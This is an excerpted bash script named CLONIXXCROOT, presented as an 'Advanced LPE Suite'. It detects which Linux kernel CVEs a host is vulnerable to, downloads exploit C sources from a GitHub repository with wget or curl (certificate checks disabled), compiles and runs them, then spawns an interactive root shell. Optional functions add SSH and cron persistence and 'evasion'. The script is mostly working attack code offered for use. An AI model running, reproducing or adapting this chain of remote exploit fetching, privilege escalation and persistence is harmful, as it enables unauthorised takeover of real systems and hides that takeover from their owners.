...
# ============================================================
#  CLONIXXCROOT v4.2 FINAL
#  Based on: linux-vuln-detector v1.2
#  Upgrade by: X & LO
#  "Auto-root chain + persistence + evasion"
# ============================================================
...
usage() {
    ...
    echo " -p | --pkglist-file <file>   - Provide package list file"
    ...
    echo " --persist                    - Setup persistence after root"
    echo " --evade                      - Enable evasion techniques"
    echo
...
checksecMode() {
    ...
    for FEATURE in "${FEATURES[@]}"; do
        i=0
        while read -r line; do arr[i]="$line"; i=$((i + 1)); done <<< "$FEATURE"
        NAME="${arr[0]}"
        PRE_NAME="${NAME:0:8}"
        NAME="${NAME:9}"
...
_download() {
    ...
    if command -v wget &>/dev/null; then
        wget -q --no-check-certificate "$url" -O "$out" 2>/dev/null && return 0
    fi
    if command -v curl &>/dev/null; then
        curl -fsSLk "$url" -o "$out" 2>/dev/null && return 0
    fi
    return 1
}
...
_root_banner() {
    ...
    echo "  ║  uid=0(root)  ✔  Privilege Escalation Successful        ║"
    echo "  ╚═══════════════════════════════════════════════════════════╝"
    echo -e "${txtrst}"
    ROOT_ACHIEVED=true
}
...
_run_exploit() {
    ...
    if [ "$(uname -s)" != "Linux" ]; then
        echo -e "  ${txtred}[!]${txtrst} $cve requires Linux"
        return 1
    fi
    ...
    if ! _download "$url" "$src"; then
        echo -e "  ${txtred}[!]${txtrst} download failed, trying fallback..."
        return 1
    fi

    echo -e "  ${txtred}[*]${txtrst} compiling: $compile_cmd"
    if ! _try_compile "$src" "${src%.c}" "$compile_cmd"; then
    ...
    echo -e "  ${txtred}[-]${txtrst} $cve failed"
    return 1
}
...
auto_root_chain() {
    ...
    for EXP in "${EXPLOITS[@]}" "${EXPLOITS_USERSPACE[@]}"; do
        ...
        if [ $PASSED_REQ -eq $REQS_NUM ]; then
            # Extract CVE number
            cve=$(echo "$NAME" | grep -oE 'CVE-[0-9]+-[0-9]+' | head -1)
            if [ -n "$cve" ]; then
                VULN_CVES+=("$cve")
                echo -e "${txtgrn}[✓]${txtrst} $cve is vulnerable"
            fi
        fi
    done

    echo
    echo -e "${txtcyan}[*]${txtrst} Found ${#VULN_CVES[@]} vulnerable CVEs"
    echo -e "${txtorange}[→]${txtrst} Starting exploitation chain..."
    echo

    # Try each vulnerable CVE
    for cve in "${VULN_CVES[@]}"; do
        if _check_root; then
            _root_banner
            return 0
        fi
        
        echo -e "${txtorange}[→]${txtrst} Trying $cve..."
        
        case $cve in
            "CVE-2016-5195") 
                _ensure_build_deps
                _run_exploit "CVE-2016-5195" \
            ...
            "CVE-2016-8655")
                ...
                _run_exploit "CVE-2016-8655" \
                    "https://raw.githubusercontent.com/shootcannon/all-lpe-collection/main/CVE-2016-8655/chocobo_root.c" \
                    "chocobo.c" \
                    "-lpthread" \
                    "./chocobo" ;;
            "CVE-2017-1000112")
            ...
            "CVE-2025-7771")
                ...
                _run_exploit "CVE-2025-7771" \
                    "https://raw.githubusercontent.com/shootcannon/all-lpe-collection/main/CVE-2025-7771/exploit.c" \
                    "exp7771.c" \
                    "-static" \
                    "./exp7771" ;;
            "CVE-2026-43500")
                ...
                _run_exploit "CVE-2026-43500" \
                    "https://raw.githubusercontent.com/shootcannon/all-lpe-collection/main/CVE-2026-43500/poc.c" \
                    "lutil.c" \
                    "-O0 -lutil" \
                    "./lutil" ;;
        esac
    ...
    if ! _check_root; then
        echo
        echo -e "${txtred}[✘]${txtrst} All exploits failed."
        echo -e "${txtgray}[i]${txtrst} Try: sudo -l, find / -perm -4000 -type f 2>/dev/null"
    fi
}
...
setup_persistence() {
    ...
    if [ -d "$home_dir/.ssh" ]; then
        ...
        echo -e "  ${txtgrn}[✓]${txtrst} SSH persistence"
    fi
    ...
    echo -e "  ${txtgrn}[✓]${txtrst} Cron persistence"
}

# ==================== EVASION ====================

setup_evasion() {
    echo -e "${txtpink}[*]${txtrst} Setting up evasion..."
...
show_banner() {
    ...
    echo "  ║  ╚═════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝     ║"
    echo "  ║                                                                       ║"
    echo "  ║  ${txtcyan}${bold}CLONIXXCROOT v4.2 FINAL${txtred}${bold} - ${txtgrn}Advanced LPE Suite${txtred}      ║"
    echo "  ║  ${txtgray}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${txtred}  ║"
    echo "  ║  ${txtgrn}[+] 40+ CVE Exploits                                        ${txtred}  ║"
...
if [ "$opt_auto_root" = "true" ]; then
    ...
    if _check_root; then
        [ "$opt_persist" = "true" ] && setup_persistence
        [ "$opt_evade" = "true" ] && setup_evasion
        echo -e "${txtgrn}${bold}[✓] DONE! Shell: $(which bash 2>/dev/null || echo '/bin/sh')${txtrst}"
        exec /bin/bash -i
    fi
    exit 0
fi

# Normal vulnerability scan mode
...
for EXP in "${EXPLOITS[@]}" "${EXPLOITS_USERSPACE[@]}"; do
    ...
    if [ $PASSED_REQ -eq $REQS_NUM ]; then
        ...
        echo -e "              ${txtgray}Reqs: $REQS${txtrst}"
        [ -n "$TAGS" ] && echo -e "              Tags: $TAGS"
        echo
    fi
done

echo -e "${txtgray}[*]${txtrst} Use -a for auto-root"
